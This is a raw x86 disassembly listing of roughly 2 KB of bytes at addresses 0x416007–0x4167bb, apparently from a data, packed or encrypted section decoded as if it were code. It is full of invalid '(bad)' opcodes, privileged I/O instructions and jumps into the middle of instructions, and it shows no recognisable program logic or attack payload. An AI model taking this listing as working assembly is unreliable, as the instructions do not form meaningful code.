  416007:	add    cl,BYTE PTR [edi]
  416009:	inc    ebp
  41600a:	clc    
  41600b:	inc    esi
  41600c:	add    esi,0xffffffb7
  41600f:	(bad)  
  416010:	test   cl,0xdd
  416013:	fisubr DWORD PTR [esi+0x5a2e6c96]
  416019:	adc    ah,BYTE PTR [edi]
  41601b:	cwde   
  41601c:	sbb    eax,0x194461b0
  416021:	sbb    DWORD PTR [eax+0x34e1b1b3],eax
  416027:	mov    ds:0xe574f82f,eax
  41602c:	or     eax,0xb2a10005
  416031:	js     0x415fdf
  416033:	out    dx,al
  416034:	sbb    BYTE PTR [ecx-0x7],bh
  416037:	rcl    DWORD PTR [edx+0x13135ad6],cl
  41603d:	xchg   esp,eax
  41603e:	and    al,0xa9
  416040:	push   0xd
  416042:	xchg   ebx,eax
  416043:	jno    0x415fd2
  416045:	xchg   esp,eax
  416046:	pop    es
  416047:	adc    DWORD PTR [edx-0x2b],edi
  41604a:	inc    ebp
  41604b:	push   es
  41604c:	pop    ds
  41604d:	aas    
  41604e:	xor    BYTE PTR [edi-0x16a5518a],ah
  416054:	sub    edx,0xffffffdc
  416057:	fcmovne st,st(3)
  416059:	pop    ebp
  41605a:	sbb    bl,BYTE PTR [edi+0x55]
  41605d:	mov    al,0xd2
  41605f:	mov    edi,0xfb1c51b3
  416064:	add    BYTE PTR [eax+0x2042f7ae],ah
  41606a:	loope  0x416074
  41606c:	cmp    bl,ah
  41606e:	sub    al,BYTE PTR [ebx-0x1b5efc3a]
  416074:	shr    ecx,1
  416076:	and    bh,BYTE PTR [edx+0x5679fa19]
  41607c:	add    eax,0x6cb3cf55
  416081:	mov    ecx,0xe6a17835
  416086:	mov    ds:0x1cacfd08,eax
  41608b:	add    esp,DWORD PTR fs:[eax+0x59]
  41608f:	mov    eax,ds:0xc6654084
  416094:	jmp    0x41601b
  416096:	add    eax,0xd596e7fa
  41609b:	add    al,0xd3
  41609d:	xchg   edx,eax
  41609e:	inc    esp
  41609f:	mov    eax,0xa8bb1f50
  4160a4:	sbb    bx,WORD PTR cs:[eax]
  4160a8:	jle    0x416034
  4160aa:	lea    ebp,[eax]
  4160ac:	and    BYTE PTR [esi-0x301d25a1],ah
  4160b2:	mov    WORD PTR [ecx],?
  4160b4:	mov    ecx,0x7cf205f6
  4160b9:	retf   0x17cf
  4160bc:	or     al,0x9f
  4160be:	repz stc 
  4160c0:	scas   al,BYTE PTR es:[edi]
  4160c1:	ss pop edx
  4160c3:	loope  0x4160e1
  4160c5:	push   ecx
  4160c6:	add    BYTE PTR [ebp+0x71],cl
  4160c9:	inc    edi
  4160ca:	stos   DWORD PTR es:[edi],eax
  4160cb:	jne    0x4160c0
  4160cd:	loopne 0x4160e4
  4160cf:	inc    edi
  4160d0:	retf   0x1d39
  4160d3:	jns    0x416077
  4160d5:	xchg   esp,eax
  4160d6:	mov    dh,0x70
  4160d8:	fsubp  st(7),st
  4160da:	xchg   ecx,eax
  4160db:	ret    0x2c1f
  4160de:	icebp  
  4160df:	mov    BYTE PTR [eax+0x6c],dl
  4160e2:	sub    DWORD PTR [ebx-0x4],edi
  4160e5:	scas   eax,DWORD PTR es:[edi]
  4160e6:	loopne 0x41613f
  4160e8:	add    eax,0xfedc2401
  4160ed:	pusha  
  4160ee:	cdq    
  4160ef:	ins    DWORD PTR es:[edi],dx
  4160f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160f1:	mov    al,ds:0x9232835e
  4160f6:	sbb    DWORD PTR [ebp-0x21],eax
  4160f9:	or     BYTE PTR [eax],cl
  4160fb:	test   eax,0xe706aeb5
  416100:	jp     0x416117
  416102:	dec    edi
  416103:	adc    eax,0x31bcfbd5
  416108:	ins    DWORD PTR es:[edi],dx
  416109:	push   esp
  41610a:	inc    esi
  41610b:	pushf  
  41610c:	hlt    
  41610d:	pop    ebp
  41610e:	inc    eax
  41610f:	jle    0x4160dc
  416111:	jle    0x416116
  416113:	fcmovu st,st(0)
  416115:	xor    DWORD PTR [ecx-0x6b],ebx
  416118:	ins    BYTE PTR es:[edi],dx
  416119:	cmp    al,bh
  41611b:	popa   
  41611c:	scas   al,BYTE PTR es:[edi]
  41611d:	fisttp QWORD PTR [edi]
  41611f:	mov    al,ds:0xbe1e05f6
  416124:	jmp    0xc454:0xbcbd549c
  41612b:	jmp    0x343eda58
  416130:	sub    eax,0x5ce5f752
  416135:	ror    cl,0xeb
  416138:	pop    ebp
  416139:	addr16 push 0xffffffcc
  41613c:	jl     0x416130
  41613e:	cmp    eax,DWORD PTR [edx]
  416140:	dec    esi
  416142:	dec    edi
  416143:	dec    eax
  416144:	imul   esi,DWORD PTR [edx+0x7c991801],0x9b972b4
  41614e:	pop    edx
  41614f:	cld    
  416150:	pop    DWORD PTR ss:[esi-0x10]
  416154:	jo     0x416112
  416156:	jge    0x416192
  416158:	punpckhdq mm7,mm6
  41615b:	pop    es
  41615c:	bound  ecx,QWORD PTR [edx+0x7c8859cd]
  416162:	or     BYTE PTR [edx+0x42],cl
  416165:	jmp    0x416128
  416167:	pop    es
  416168:	sub    BYTE PTR [edx+edi*8-0x38f22560],bl
  41616f:	mov    edi,0xdc5d054e
  416174:	aaa    
  416175:	mov    esi,0xc6bdac67
  41617a:	xchg   edi,eax
  41617b:	xor    BYTE PTR [edx+edx*4-0x65],bh
  41617f:	pop    esi
  416180:	mov    ah,0x76
  416182:	xor    al,0xe0
  416184:	cdq    
  416185:	mov    ds:0x665a22b9,eax
  41618a:	push   0x78e6fe79
  41618f:	ja     0x41612d
  416191:	pop    edx
  416192:	mov    ecx,0xcdd0e907
  416197:	or     DWORD PTR [eax-0x6b],ebp
  41619a:	fdivr  DWORD PTR [edx+0x7f56eb32]
  4161a0:	ins    BYTE PTR es:[edi],dx
  4161a1:	das    
  4161a2:	sahf   
  4161a3:	fs retf 
  4161a5:	sahf   
  4161a6:	sbb    al,ah
  4161a8:	in     eax,0x1e
  4161aa:	jge    0x41622b
  4161ac:	psraw  mm1,mm3
  4161af:	xchg   ebx,eax
  4161b0:	cld    
  4161b1:	dec    esp
  4161b2:	cli    
  4161b3:	and    bh,BYTE PTR [ebx+0x6c]
  4161b6:	test   eax,0x5ce845c1
  4161bb:	test   DWORD PTR [edx],edx
  4161bd:	cmp    esi,DWORD PTR [edx-0x6e]
  4161c0:	jle    0x4161b4
  4161c2:	loope  0x41619c
  4161c4:	xchg   esp,edi
  4161c6:	jle    0x41617b
  4161c8:	nop
  4161c9:	clc    
  4161ca:	rcr    BYTE PTR [ebp+0x62],cl
  4161cd:	mov    dl,0xe2
  4161cf:	jmp    0x416190
  4161d1:	sbb    eax,0x1b5330e7
  4161d6:	jb     0x4161a5
  4161d8:	add    ebp,edi
  4161da:	inc    esp
  4161db:	icebp  
  4161dc:	sub    eax,0xe155d96
  4161e1:	or     eax,0xe398bd5e
  4161e6:	add    DWORD PTR [ecx],esp
  4161e8:	hlt    
  4161e9:	outs   dx,BYTE PTR ds:[esi]
  4161ea:	neg    BYTE PTR [ecx-0x7e]
  4161ed:	cwde   
  4161ee:	shr    DWORD PTR [edx+0x7a],cl
  4161f1:	ins    DWORD PTR es:[edi],dx
  4161f2:	std    
  4161f3:	clc    
  4161f4:	xor    al,0xae
  4161f6:	inc    ebp
  4161f7:	and    al,BYTE PTR [esi]
  4161f9:	cmp    BYTE PTR [edi+0x63d52156],dh
  4161ff:	stc    
  416200:	push   ebx
  416201:	sar    DWORD PTR [ebx-0x49],cl
  416204:	or     eax,0x2942dce1
  416209:	es mov edi,0x48c9e26c
  41620f:	(bad)  
  416211:	pop    ecx
  416212:	push   esi
  416213:	xchg   ebp,eax
  416214:	rcr    BYTE PTR [ebp-0x30],cl
  416217:	nop
  416218:	ins    BYTE PTR es:[edi],dx
  416219:	or     BYTE PTR [ecx],bh
  41621b:	sub    eax,0xb5862a04
  416220:	push   edx
  416221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416222:	cli    
  416223:	icebp  
  416224:	jg     0x4161ca
  416226:	pop    ebx
  416227:	nop
  416228:	adc    eax,0x589fc0aa
  41622d:	(bad)
  416230:	inc    ecx
  416231:	ja     0x41628b
  416233:	pushf  
  416234:	stc    
  416235:	add    BYTE PTR [eax+0x1d],0xb9
  416239:	sbb    DWORD PTR [ebx-0x287ad8e2],esp
  41623f:	adc    eax,0x2d50609
  416244:	fsub   st(1),st
  416246:	mov    ebp,0x33b06b32
  41624b:	or     BYTE PTR [edi-0x2fa7943a],dh
  416251:	(bad)  
  416252:	lods   eax,DWORD PTR ds:[esi]
  416253:	cmp    al,0x3b
  416255:	pop    esi
  416256:	leave  
  416257:	mov    bl,BYTE PTR [ecx]
  416259:	mov    dh,0xf2
  41625b:	(bad)  
  41625d:	out    dx,eax
  41625e:	test   eax,0xa44cfd26
  416263:	stos   DWORD PTR es:[edi],eax
  416264:	pop    edi
  416265:	hlt    
  416266:	sbb    DWORD PTR [esi+0x4b],0xffffffb7
  41626a:	mov    bh,0xbc
  41626c:	and    DWORD PTR [ebp-0x45],eax
  41626f:	retf   0xd2ca
  416272:	add    BYTE PTR [esi],cl
  416274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416275:	and    dl,BYTE PTR [edi+0x1e]
  416278:	pop    edi
  416279:	lock cs hlt 
  41627c:	ds push edi
  41627e:	jmp    DWORD PTR ds:0x62cb9b80
  416284:	gs dec ebx
  416286:	inc    ecx
  416287:	and    al,0x7a
  416289:	mov    al,ds:0x9cc17117
  41628e:	jl     0x416287
  416290:	sti    
  416291:	daa    
  416292:	dec    esp
  416293:	cmp    BYTE PTR [ebp-0x5c],ch
  416296:	jne    0x416287
  416298:	xor    eax,0x647c23fb
  41629d:	imul   ebx,DWORD PTR [edi-0x78],0xffffffb2
  4162a1:	test   DWORD PTR [ebp+ecx*8+0x23b7457c],ecx
  4162a8:	jnp    0x4162a3
  4162aa:	mov    ebp,0x281dc0f4
  4162af:	les    esi,FWORD PTR [edi+0x2af04ca9]
  4162b5:	mov    dh,dh
  4162b7:	mov    edi,0x8ad44e45
  4162bc:	fld    QWORD PTR [eax+0x2afefbad]
  4162c2:	fcom   DWORD PTR [esi-0x14779b46]
  4162c8:	adc    BYTE PTR [edi-0xb363943],0xa1
  4162cf:	mov    ebp,DWORD PTR [edx+0x112e86b]
  4162d5:	jnp    0x4162ff
  4162d7:	pop    esi
  4162d8:	ins    DWORD PTR es:[edi],dx
  4162d9:	xchg   ebx,eax
  4162da:	arpl   WORD PTR [edx-0x21],si
  4162dd:	cmc    
  4162de:	mov    fs,WORD PTR [ecx+esi*1-0x7aa7fcaa]
  4162e5:	mov    edi,0xc7769400
  4162ea:	js     0x416361
  4162ec:	js     0x41627b
  4162ee:	jmp    0x4162dd
  4162f0:	add    eax,0x6a96304b
  4162f5:	adc    edi,edx
  4162f7:	popf   
  4162f8:	or     ebp,DWORD PTR [ecx]
  4162fa:	sub    DWORD PTR [edi-0x1b],edi
  4162fd:	rcr    DWORD PTR [esp+edi*4],0x74
  416301:	mov    al,0x80
  416303:	sbb    ch,BYTE PTR [esi-0x3c54ffb0]
  416309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41630a:	(bad)  
  41630b:	ja     0x4162b5
  41630d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41630e:	fadd   DWORD PTR [ebp-0x21]
  416311:	pop    ss
  416312:	pusha  
  416313:	pop    ss
  416314:	popa   
  416315:	xchg   ebp,eax
  416316:	pop    esi
  416317:	sub    DWORD PTR [bx+di-0x5e],esp
  41631b:	xchg   ecx,eax
  41631c:	fimul  WORD PTR [eax+0x2c]
  41631f:	in     al,0x69
  416321:	cli    
  416322:	dec    esp
  416323:	sbb    esp,esp
  416325:	and    BYTE PTR [ecx-0x7285591c],dh
  41632b:	(bad)  
  41632c:	daa    
  41632d:	jle    0x4162b7
  41632f:	fistp  WORD PTR [ebx+0x2d15f982]
  416335:	int3   
  416336:	hlt    
  416337:	enter  0xad71,0x7c
  41633b:	ret    
  41633c:	cwde   
  41633d:	cmc    
  41633e:	mov    eax,0xd1716051
  416343:	mov    ch,0x7f
  416345:	call   0x2d65aae4
  41634a:	(bad)  
  41634c:	sbb    edx,eax
  41634e:	cmp    cl,BYTE PTR [eax]
  416350:	cs jae 0x41632c
  416353:	pop    ebx
  416354:	pop    ecx
  416355:	call   0x59ed:0x4b60b3b5
  41635c:	ret    0xd121
  41635f:	dec    DWORD PTR [esi+0x6aa0035d]
  416365:	push   0x1a
  416367:	aad    0xec
  416369:	push   edi
  41636a:	mov    bh,0xef
  41636c:	int3   
  41636d:	jbe    0x41633d
  41636f:	push   eax
  416370:	or     ah,BYTE PTR [ecx-0x6e]
  416373:	pop    ebp
  416374:	xchg   esi,eax
  416375:	mov    dh,0xf4
  416377:	add    DWORD PTR [eax-0x76],edi
  41637a:	jmp    0x5003:0x99bf0010
  416381:	dec    edi
  416382:	jecxz  0x416325
  416384:	and    eax,0xbaa10a25
  416389:	nop
  41638a:	push   esp
  41638b:	outs   dx,BYTE PTR ds:[esi]
  41638c:	ret    0xfc6b
  41638f:	mov    bh,0xeb
  416391:	je     0x4163e9
  416393:	pop    edx
  416394:	pavgb  mm0,QWORD PTR [eax+0x73de596a]
  41639b:	js     0x4163c7
  41639d:	lods   al,BYTE PTR ds:[esi]
  41639e:	(bad)  [esi-0x28ab23b9]
  4163a4:	fsubr  QWORD PTR [eax+0x43]
  4163a7:	(bad)  
  4163a8:	into   
  4163a9:	sahf   
  4163aa:	dec    ebp
  4163ab:	outs   dx,DWORD PTR ds:[esi]
  4163ac:	sbb    edx,DWORD PTR [ebx-0x476a42ea]
  4163b2:	test   DWORD PTR [eax-0x5f],eax
  4163b5:	enter  0xd523,0xee
  4163b9:	ss mov bl,0x97
  4163bc:	inc    esp
  4163bd:	pop    ss
  4163be:	pop    ds
  4163bf:	scas   al,BYTE PTR es:[edi]
  4163c0:	loop   0x4163b4
  4163c2:	add    eax,0x8fafe513
  4163c7:	in     eax,dx
  4163c8:	scas   eax,DWORD PTR es:[edi]
  4163c9:	retf   
  4163ca:	adc    al,0x4a
  4163cc:	jnp    0x4163c6
  4163ce:	std    
  4163cf:	adc    dh,dh
  4163d1:	sbb    al,BYTE PTR [edx+ebx*2]
  4163d4:	leave  
  4163d5:	and    al,0x7d
  4163d7:	add    dh,ah
  4163d9:	add    BYTE PTR [esi-0x59],0x86
  4163dd:	retf   
  4163de:	inc    edx
  4163df:	cmp    al,0x33
  4163e1:	xchg   edi,eax
  4163e2:	rcl    BYTE PTR [ebp+0x2219fa53],cl
  4163e8:	ja     0x41642a
  4163ea:	out    dx,al
  4163eb:	ins    BYTE PTR es:[edi],dx
  4163ec:	push   eax
  4163ed:	xchg   edi,eax
  4163ee:	aas    
  4163ef:	in     al,dx
  4163f0:	mov    al,0x7c
  4163f2:	jnp    0x41639e
  4163f4:	mov    ebx,edx
  4163f6:	sub    al,0x41
  4163f8:	cmp    DWORD PTR [edi+0x232c65a8],edi
  4163fe:	(bad)  
  4163ff:	cli    
  416400:	dec    esp
  416401:	jbe    0x4163fe
  416403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416404:	aad    0xf7
  416406:	test   DWORD PTR [ebp-0x5c],ebx
  416409:	cld    
  41640a:	mov    bl,0xab
  41640c:	xchg   eax,eax
  41640e:	cmp    BYTE PTR [eax+eiz*8],dl
  416411:	fcomp  QWORD PTR [edx-0x2e8ce228]
  416417:	loop   0x4163f8
  416419:	cmp    dl,BYTE PTR [edx-0xc4dc426]
  41641f:	dec    eax
  416420:	rcr    DWORD PTR [edx-0x77],0xf3
  416424:	retf   
  416425:	scas   eax,DWORD PTR es:[edi]
  416426:	clc    
  416427:	sub    BYTE PTR [ebx-0x7ec4b26d],dh
  41642d:	sub    eax,0x7c74d04c
  416432:	icebp  
  416433:	mov    ah,BYTE PTR [ebx]
  416435:	cmc    
  416436:	add    BYTE PTR [ebx],bh
  416438:	jnp    0x41640a
  41643a:	inc    esi
  41643b:	pop    ebp
  41643c:	jo     0x4164aa
  41643e:	test   al,0xb
  416440:	in     al,dx
  416441:	dec    ebp
  416442:	xchg   ebx,eax
  416443:	loopne 0x4164a4
  416445:	jg     0x4163c7
  416447:	xchg   BYTE PTR [esi-0x25],cl
  41644a:	jecxz  0x416445
  41644c:	sub    dx,bx
  41644f:	or     ch,dl
  416451:	arpl   cx,bp
  416453:	push   esi
  416454:	aaa    
  416455:	pop    eax
  416456:	and    BYTE PTR [esi+0x6a866ba8],ch
  41645c:	mov    bl,0xa7
  41645e:	cmp    DWORD PTR [eax-0x4c88086d],edx
  416464:	aas    
  416465:	retfw  
  416467:	repnz dec edi
  416469:	xchg   edi,eax
  41646a:	dec    esi
  41646b:	aas    
  41646c:	aaa    
  41646d:	dec    ecx
  41646e:	push   esp
  41646f:	out    dx,eax
  416470:	xchg   esp,eax
  416471:	or     BYTE PTR [eax+0x2a7e9a70],bh
  416477:	jmp    0x416455
  416479:	or     ebp,eax
  41647b:	inc    ebp
  41647c:	add    DWORD PTR [edi+0x6d],edi
  41647f:	or     DWORD PTR [edx+0x610e39],edi
  416485:	push   cs
  416486:	fnstsw WORD PTR [ecx+edi*8-0x57]
  41648a:	sbb    BYTE PTR [ecx+ebx*2-0x24],ah
  41648e:	(bad)  
  41648f:	je     0x416507
  416491:	xchg   esp,eax
  416492:	mov    ah,0xbe
  416494:	and    DWORD PTR [edx-0x59],eax
  416497:	xor    al,0x71
  416499:	xor    BYTE PTR [ebx],cl
  41649b:	inc    ecx
  41649c:	xor    al,0x47
  41649e:	mov    ch,0x7b
  4164a0:	aam    0xba
  4164a2:	les    esp,FWORD PTR [ecx+esi*8-0x1cd817fb]
  4164a9:	cmp    esp,DWORD PTR [edx+0x1cedfe8a]
  4164af:	or     eax,0xaf7d85b0
  4164b4:	sbb    ebx,DWORD PTR [eax]
  4164b6:	pop    ebp
  4164b7:	lods   al,BYTE PTR ds:[esi]
  4164b8:	adc    al,0xb0
  4164ba:	pop    es
  4164bb:	sbb    ebx,DWORD PTR [esi+eiz*2-0x38]
  4164bf:	xor    dh,BYTE PTR [esi+0x6e]
  4164c2:	adc    BYTE PTR [esi+0x67],ah
  4164c5:	add    ebx,ebp
  4164c7:	test   al,0x5d
  4164c9:	fbstp  TBYTE PTR [edx+0x68997206]
  4164cf:	iret   
  4164d0:	in     eax,dx
  4164d1:	push   ecx
  4164d2:	or     al,0xd
  4164d4:	leave  
  4164d5:	mov    dl,0x9a
  4164d7:	stos   DWORD PTR es:[edi],eax
  4164d8:	mov    cl,0xe2
  4164da:	imul   DWORD PTR [esi]
  4164dc:	rol    DWORD PTR [eax+0x62],0x47
  4164e0:	(bad)  
  4164e2:	adc    cl,ch
  4164e4:	push   esi
  4164e5:	idiv   BYTE PTR [eax+0x4adc0816]
  4164eb:	and    dh,dh
  4164ed:	les    ecx,FWORD PTR [ecx+0x24]
  4164f0:	(bad)  
  4164f1:	push   esp
  4164f2:	xor    ah,ah
  4164f4:	aas    
  4164f5:	js     0x4164d4
  4164f7:	inc    eax
  4164f8:	inc    esi
  4164f9:	cmp    eax,0x9c9c5c56
  4164fe:	loopne 0x4164db
  416500:	sti    
  416501:	imul   esi,DWORD PTR [ebp+0x51],0xffffff8d
  416505:	sbb    edi,esi
  416507:	imul   edi,DWORD PTR [ecx+0x72c73533],0x8fb522fc
  416511:	adc    esi,edi
  416513:	push   ds
  416514:	cmp    DWORD PTR [edi],0x5b73ed12
  41651a:	mov    edx,0xdba1b7b0
  41651f:	dec    DWORD PTR [ebx]
  416521:	mov    WORD PTR [esi-0x6d1fbb0e],es
  416527:	lea    ebx,[esi+0x6c]
  41652a:	jb     0x4164cd
  41652c:	xor    edi,ebp
  41652e:	xchg   esi,eax
  41652f:	sbb    DWORD PTR [eax+0x2d3e8fdd],0x2544109d
  416539:	scas   al,BYTE PTR es:[edi]
  41653a:	jl     0x416554
  41653c:	mov    cl,0xe7
  41653e:	xchg   edi,eax
  41653f:	test   al,0x7c
  416541:	jl     0x416549
  416543:	jbe    0x4165a8
  416545:	adc    al,0xb0
  416547:	xor    eax,0x2f2dfe0c
  41654c:	(bad)  
  41654d:	jae    0x416516
  41654f:	sub    dh,BYTE PTR [eax]
  416551:	pop    esi
  416552:	jmp    0x8c86:0xd946392d
  416559:	adc    edx,ecx
  41655b:	in     al,0x95
  41655d:	test   al,0xcc
  416560:	aam    0x6d
  416562:	xor    DWORD PTR [ebx-0x19132029],ebx
  416568:	sbb    BYTE PTR [ecx-0x3d99abec],dh
  41656e:	xor    DWORD PTR [edx+0x77],ebx
  416571:	mov    al,0x71
  416573:	mov    ds:0xc198d57c,al
  416578:	push   ss
  416579:	push   cs
  41657a:	dec    esp
  41657b:	repnz ud2 
  41657e:	retfw  0x4b34
  416582:	test   BYTE PTR [ecx+0x12],ch
  416585:	jl     0x4165ae
  416587:	nop
  416588:	jle    0x4165da
  41658a:	adc    BYTE PTR ds:0xc98fffb1,dl
  416590:	add    DWORD PTR [edi+0x795f248b],ebp
  416596:	mov    ds:0xf111906d,eax
  41659b:	mov    esp,0x1b675010
  4165a0:	add    al,0x4b
  4165a2:	push   esp
  4165a3:	aam    0xff
  4165a5:	sbb    DWORD PTR [ebx+0x21b3bd0e],ebp
  4165ab:	aam    0x7b
  4165ad:	and    BYTE PTR [esi],ch
  4165af:	lods   al,BYTE PTR ds:[esi]
  4165b0:	mov    ds:0x469ee1b6,al
  4165b5:	sub    eax,0x32945835
  4165ba:	arpl   WORD PTR [esi+0x6ff97653],sp
  4165c0:	lahf   
  4165c1:	in     eax,dx
  4165c2:	sub    eax,0x4afb7033
  4165c7:	xchg   ecx,eax
  4165c8:	cmp    edi,DWORD PTR [ebx+0x6130297]
  4165ce:	xor    eax,0x3082f461
  4165d3:	sbb    DWORD PTR [esp+ebx*2],0xffffffca
  4165d7:	or     dl,bh
  4165d9:	push   esp
  4165da:	out    0x8,al
  4165dc:	outs   dx,DWORD PTR ds:[esi]
  4165dd:	enter  0x68aa,0x7b
  4165e1:	mov    ?,eax
  4165e3:	dec    ebp
  4165e4:	retf   
  4165e5:	jmp    0x416654
  4165e7:	push   edx
  4165e8:	push   cs
  4165e9:	ds mov eax,0xaab30b22
  4165ef:	aad    0xa9
  4165f1:	dec    esi
  4165f2:	jge    0x4165db
  4165f4:	push   eax
  4165f5:	xchg   BYTE PTR [ebx],bh
  4165f7:	fdivr  DWORD PTR [ecx+0x21]
  4165fa:	adc    DWORD PTR [edx],esi
  4165fc:	out    0x20,al
  4165fe:	std    
  4165ff:	aam    0x4c
  416601:	fsubr  DWORD PTR [eax]
  416603:	inc    edi
  416604:	push   esi
  416605:	inc    ebp
  416606:	adc    al,0x2
  416608:	sbb    eax,DWORD PTR [esp+eax*4+0x4d94cb0c]
  41660f:	xchg   esi,edi
  416611:	mul    DWORD PTR [ebx-0x68]
  416614:	add    DWORD PTR ss:[edx],ecx
  416617:	adc    edi,DWORD PTR [edx+0x29]
  41661a:	repnz fmul QWORD PTR [ecx+eax*2+0x51]
  41661f:	or     eax,0x5cd2f30b
  416624:	lods   al,BYTE PTR ds:[esi]
  416625:	jns    0x416693
  416627:	mov    WORD PTR [edx+ecx*1+0x2c],cs
  41662b:	mov    ebx,0x30f13393
  416630:	pop    es
  416631:	call   0xcc57:0x6960d737
  416638:	in     eax,dx
  416639:	push   0xffffffbd
  41663b:	iret   
  41663c:	or     dl,BYTE PTR [edi-0xb]
  41663f:	(bad)  
  416640:	pop    edx
  416641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416642:	call   0x5e1000e1
  416647:	jne    0x4166b9
  416649:	pop    edx
  41664a:	daa    
  41664b:	ins    DWORD PTR es:[edi],dx
  41664c:	das    
  41664d:	or     edx,ebx
  41664f:	jmp    0x62d5:0x9fb97c55
  416656:	fs fs sub al,0xfe
  41665a:	mov    esp,edx
  41665c:	arpl   dx,si
  41665e:	mov    esp,0x6fa6b6a6
  416663:	adc    BYTE PTR [ecx],ah
  416665:	ja     0x416653
  416667:	jl     0x4165ff
  416669:	aam    0xf5
  41666b:	mov    BYTE PTR [eax],ah
  41666d:	scas   al,BYTE PTR es:[edi]
  41666e:	aaa    
  41666f:	xor    DWORD PTR [ebp+0x14],ebx
  416672:	iret   
  416673:	mov    bl,0x3a
  416675:	loop   0x4166c1
  416677:	pop    ds
  416678:	lods   eax,DWORD PTR ds:[esi]
  416679:	call   0xc2274396
  41667e:	jne    0x4166a8
  416680:	push   0x62
  416682:	jnp    0x416624
  416684:	inc    edi
  416685:	mov    esp,DWORD PTR [si-0x33]
  416689:	ins    DWORD PTR es:[edi],dx
  41668a:	cdq    
  41668b:	ja     0x4166ab
  41668d:	clc    
  41668e:	adc    dl,BYTE PTR [ebx]
  416690:	sub    BYTE PTR [ebx+0x68],bh
  416693:	into   
  416694:	imul   eax,DWORD PTR [edi-0x50c56b5b],0x73
  41669b:	das    
  41669c:	push   0xffffffa1
  41669e:	scas   al,BYTE PTR es:[edi]
  41669f:	cmc    
  4166a0:	push   eax
  4166a1:	js     0x4166fa
  4166a3:	cmp    ch,BYTE PTR ds:0x9790cb32
  4166a9:	sar    edx,0x7e
  4166ac:	inc    ebp
  4166ad:	jb     0x4166c1
  4166af:	push   ebx
  4166b0:	xchg   esi,eax
  4166b1:	stos   BYTE PTR es:[edi],al
  4166b2:	dec    esp
  4166b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b4:	jmp    0x41665f
  4166b6:	cmp    ebp,0x455974c
  4166bc:	popf   
  4166bd:	xor    al,0x42
  4166bf:	in     eax,0x22
  4166c1:	mov    esp,db2
  4166c4:	cmp    al,0x71
  4166c6:	shl    BYTE PTR [ebp+0x62],1
  4166c9:	push   ds
  4166ca:	std    
  4166cb:	or     BYTE PTR [edx-0x27],0x4e
  4166cf:	stc    
  4166d0:	fadd   DWORD PTR [esp+esi*1]
  4166d3:	dec    edx
  4166d4:	lds    eax,FWORD PTR [ebp+0x46]
  4166d7:	mov    eax,ds:0x8e4ace32
  4166dc:	sbb    ebp,DWORD PTR [esi+0x6a]
  4166df:	idiv   BYTE PTR cs:[edi]
  4166e2:	std    
  4166e3:	stos   DWORD PTR es:[edi],eax
  4166e4:	sbb    ecx,DWORD PTR [edx]
  4166e6:	pop    ecx
  4166e7:	shr    BYTE PTR [edx+0x13],cl
  4166ea:	icebp  
  4166eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166ec:	adc    BYTE PTR [ebp+0xbc0ea4f],ah
  4166f2:	and    ah,bl
  4166f4:	xchg   edx,eax
  4166f5:	(bad)  
  4166f6:	scas   eax,DWORD PTR es:[edi]
  4166f7:	xor    eax,0x973ba052
  4166fc:	push   ecx
  4166fd:	pop    ecx
  4166fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ff:	inc    eax
  416700:	pop    ds
  416701:	je     0x4166cf
  416703:	push   edi
  416705:	cmp    dl,BYTE PTR [edi+0x67]
  416708:	jo     0x41668d
  41670a:	or     eax,0xabffbb0f
  41670f:	pop    edi
  416710:	dec    esi
  416711:	retf   
  416712:	push   ebp
  416713:	sub    eax,0x745990ff
  416718:	push   ebx
  416719:	ficomp DWORD PTR [ebp+0x20]
  41671c:	xor    BYTE PTR [esi],bh
  41671e:	xor    BYTE PTR [ebx+0x6ee3ad2e],ch
  416724:	mov    bh,0xdb
  416726:	cmp    eax,0xd9bf4413
  41672b:	std    
  41672c:	and    BYTE PTR [ebx+0x22],dl
  41672f:	jnp    0x416738
  416731:	push   ebp
  416732:	cmp    dl,BYTE PTR [edx-0x10]
  416735:	and    ebx,DWORD PTR [ebp-0x57680e10]
  41673b:	adc    al,BYTE PTR [edx]
  41673d:	ins    BYTE PTR es:[edi],dx
  41673e:	jp     0x416778
  416740:	and    al,0x87
  416742:	out    0x20,eax
  416744:	mov    ch,0xc2
  416746:	mov    ah,0x17
  416748:	sbb    DWORD PTR [ebx],edi
  41674a:	adc    al,bh
  41674c:	and    BYTE PTR [edx],dl
  41674e:	jo     0x4167c4
  416750:	jmp    0x8a8:0xdca8669b
  416757:	jle    0x4167b6
  416759:	shl    BYTE PTR [eax],cl
  41675b:	ss push ecx
  41675d:	dec    ebx
  41675e:	push   edi
  41675f:	jge    0x41673a
  416761:	xor    al,0x10
  416763:	fadd   st(2),st
  416765:	les    esp,FWORD PTR [esi+ebx*1-0x33c617a8]
  41676c:	inc    ecx
  41676d:	push   ebp
  41676e:	sbb    eax,0xcd406320
  416773:	out    dx,eax
  416774:	cwde   
  416775:	adc    BYTE PTR [ecx-0x3a],ah
  416778:	fisubr DWORD PTR [ebp-0x6d]
  41677b:	sub    DWORD PTR [esi-0x581de762],ebp
  416781:	pop    ecx
  416782:	sahf   
  416783:	mov    dh,0x61
  416785:	mov    ds:0x5900b3c4,eax
  41678a:	jge    0x4167a5
  41678c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41678d:	xchg   DWORD PTR [edi],eax
  41678f:	mov    ds:0x999fc1bd,eax
  416794:	sub    DWORD PTR [ecx+0x60],edi
  416797:	mov    al,ds:0x9fa65a12
  41679c:	xor    dl,BYTE PTR ds:0xef6844db
  4167a2:	push   ebp
  4167a3:	les    esp,FWORD PTR [ebx]
  4167a5:	not    DWORD PTR [edx]
  4167a7:	sub    eax,0xad8557eb
  4167ac:	xor    al,0x43
  4167ae:	jno    0x41682f
  4167b0:	adc    al,0x72
  4167b2:	sahf   
  4167b3:	pop    esi
  4167b4:	dec    eax
  4167b5:	dec    esi
  4167b6:	pop    edx
  4167b7:	(bad)  
  4167b8:	imul   bh
  4167ba:	clc    
  4167bb:	cli    
